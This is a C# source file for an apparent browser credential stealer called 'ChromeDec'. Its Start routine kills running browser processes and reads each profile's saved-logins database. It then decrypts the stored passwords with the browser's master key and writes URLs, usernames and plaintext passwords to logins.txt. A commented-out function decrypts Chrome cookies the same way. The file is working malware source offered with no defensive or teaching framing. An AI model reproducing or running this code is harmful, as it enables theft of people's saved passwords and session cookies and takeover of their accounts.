using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using SqliteReader;
using ChromeDec.Browser;

namespace ChromeDec
{
    public class Class1
    {
        private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        private static readonly BrowserManager browserManager = new BrowserManager();

        /*private static void GetCookies()
        {
            browserManager.Init();

            var result = new List<CookieModel>();

            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var p = Path.GetFullPath(appdata + COOKIES_DATA_PATH);

            if (!File.Exists(p))
                return;

            SqLiteHandler sqLiteHandler = new SqLiteHandler(p);
            sqLiteHandler.ReadTable("cookies");

            int num = 0;
            int num2 = sqLiteHandler.GetRowCount() - 1;

            var key = AesGcm256.GetKey();

            for (int j = num; j <= num2; j++)
            {
                string host_key = sqLiteHandler.GetValue(j, "host_key");
                string name = sqLiteHandler.GetValue(j, "name");
                string encrypted_value = sqLiteHandler.GetValue(j, "encrypted_value");

                if (encrypted_value.StartsWith("v10") || encrypted_value.StartsWith("v11"))
                {
                    AesGcm256.Prepare(Encoding.Default.GetBytes(encrypted_value), out byte[] nonce, out byte[] ciphertextTag);
                    var value = AesGcm256.Decrypt(ciphertextTag, key, nonce);

                    if (string.IsNullOrEmpty(value))
                        continue;

                    result.Add(new CookieModel()
                    {
                        Host = host_key,
                        Name = name,
                        Value = value
                    });
                }
                else
                {
                    string value = AesGcm256.DecryptNoKey(Encoding.Default.GetBytes(encrypted_value));

                    if (string.IsNullOrEmpty(value))
                        continue;

                    result.Add(new CookieModel()
                    {
                        Host = host_key,
                        Name = name,
                        Value = value
                    });
                }
            }

            StringBuilder sb = new StringBuilder();

            foreach (var item in result)
                sb.AppendLine(item.ToString());

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            File.WriteAllText(Path.Combine(desktop, "passwordsBro", "cookies.txt"), sb.ToString());
        }*/


        public static void Start()
        {
            List<CredentialModel> result = new List<CredentialModel>();
            browserManager.Init();

            foreach (BrowserModel browser in browserManager.GetBrowsers())
            {
                if (!BrowserExists(browser.Location))
                    continue;

                KillProcess(browser.ProcessName);
                result.AddRange(GetLogins(browser.Location));
            }

            SaveLogins(result);
        }

        private static void SaveLogins(List<CredentialModel> credentials)
        {
            StringBuilder sb = new StringBuilder();

            foreach (CredentialModel credentialsItem in credentials)
                sb.AppendLine(credentialsItem.ToString());

            File.WriteAllText("logins.txt", sb.ToString());
        }

        private static List<CredentialModel> GetLogins(string path)
        {
            List<string> profiles = browserManager.GetProfiles(path);
            List<CredentialModel> creds = new List<CredentialModel>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile));
            }

            return creds;
        }

        private static List<CredentialModel> GetProfileLogins(string path)
        {
            List<CredentialModel> credentialModels = new List<CredentialModel>();

            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
            sqLiteHandler.ReadTable("logins");

            byte[] masterKey = AesGcm256.GetMasterKey(path);

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string password = GetEncryptedValue(sqLiteHandler.GetValue(i, "password_value"), masterKey);

                    if (string.IsNullOrEmpty(password))
                        continue;

                    credentialModels.Add(new CredentialModel()
                    {
                        Url = sqLiteHandler.GetValue(i, "origin_url"),
                        Username = sqLiteHandler.GetValue(i, "username_value"),
                        Password = password
                    });
                }
                catch { }
            }

            return credentialModels;
        }

        private static string GetEncryptedValue(string encrypted, byte[] masterKey)
        {
            if (encrypted.StartsWith("v10") || encrypted.StartsWith("v11"))
            {
                AesGcm256.Prepare(Encoding.Default.GetBytes(encrypted), out byte[] nonce, out byte[] ciphertextTag);
                return AesGcm256.Decrypt(ciphertextTag, masterKey, nonce);
            }

            return AesGcm256.DecryptNoKey(Encoding.Default.GetBytes(encrypted));
        }

        private static bool BrowserExists(string path) => Directory.Exists(path);

        private static void KillProcess(string name)
        {
            Process[] processes = Process.GetProcessesByName(name);

            foreach (var process in processes)
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }
        }
    }
}
